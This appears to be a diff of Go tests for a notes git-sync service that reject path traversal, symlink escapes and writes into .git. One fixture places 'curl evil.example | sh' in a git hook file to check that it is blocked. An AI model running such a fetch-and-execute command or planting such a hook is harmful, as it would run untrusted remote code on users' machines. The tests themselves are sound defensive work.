@@ -22,7 +22,7 @@ func TestProcessNotesBatch_RejectsEscapingPaths(t *testing.T) {
 	changed, err := svc.processNotesBatch([]*domain.Note{
 		{Path: "../evil", Content: "escape", Action: domain.NoteActionCreate},
 		{Path: "ok/note.md", Content: "fine", Action: domain.NoteActionCreate},
-	}, wsPath)
+	}, &domain.GitSyncConfig{}, wsPath)
 	require.NoError(t, err)
 	require.True(t, changed)
 
@@ -40,7 +40,7 @@ func TestProcessNotesBatch_RejectsGitDir(t *testing.T) {
 	svc := newTestGitSyncService(nil)
 	_, err := svc.processNotesBatch([]*domain.Note{
 		{Path: ".git/hooks/post-checkout.sh", Content: "curl evil.example | sh", Action: domain.NoteActionCreate},
-	}, wsPath)
+	}, &domain.GitSyncConfig{}, wsPath)
 	require.NoError(t, err)
 	require.NoFileExists(t, filepath.Join(wsPath, ".git", "hooks", "post-checkout.sh"),
 		"paths containing a .git segment must never be written")
@@ -88,7 +88,7 @@ func TestProcessNotesBatch_RejectsSymlinkEscape(t *testing.T) {
 	svc := newTestGitSyncService(nil)
 	_, err := svc.processNotesBatch([]*domain.Note{
 		{Path: "link/evil.md", Content: "escape via symlink", Action: domain.NoteActionCreate},
-	}, wsPath)
+	}, &domain.GitSyncConfig{}, wsPath)
 	require.NoError(t, err)
 	require.NoFileExists(t, filepath.Join(outside, "evil.md"),
 		"a symlink inside the workspace must not allow writes outside it")
@@ -106,7 +106,7 @@ func TestProcessNotesBatch_RejectsEscapingDelete(t *testing.T) {
 	svc := newTestGitSyncService(nil)
 	_, err := svc.processNotesBatch([]*domain.Note{
 		{Path: "../keep", Action: domain.NoteActionDelete},
-	}, wsPath)
+	}, &domain.GitSyncConfig{}, wsPath)
 	require.NoError(t, err)
 	require.FileExists(t, outside, "escaping delete path must not remove files outside the workspace")
 }
@@ -129,7 +129,7 @@ func TestProcessNotesBatch_RejectsSymlinkTarget(t *testing.T) {
 	_, err := svc.processNotesBatch([]*domain.Note{
 		{Path: "notes/a.md", Content: "overwritten via symlink", Action: domain.NoteActionCreate},
 		{Path: "notes/ok.md", Content: "fine", Action: domain.NoteActionCreate},
-	}, wsPath)
+	}, &domain.GitSyncConfig{}, wsPath)
 	require.NoError(t, err)
 
 	got, err := os.ReadFile(outsideFile)
